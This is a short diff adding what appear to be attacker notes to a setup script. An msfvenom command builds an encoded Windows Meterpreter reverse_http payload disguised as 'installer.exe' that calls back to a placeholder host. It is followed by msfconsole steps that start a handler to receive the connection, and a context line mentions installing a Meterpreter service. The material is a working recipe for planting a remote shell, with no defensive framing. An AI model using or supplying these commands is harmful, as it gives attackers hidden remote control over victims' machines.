@@ -1,3 +1,14 @@
+# MSFVENOM
+msfvenom -p windows/meterpreter/reverse_http -e x86/shikata_ga_nai -i 10 -f exe-service -o installer.exe lhost=CBURL lport=CBPORT
+
+# MSFCONSOLE
+msfconsole
+set multi/handler
+set payload windows/meterpreter/reverse_http
+set lhost IP
+set lport PORT
+exploit
+
 # Download and install meterpreter service
 cd d:\Setup\Binaries
 
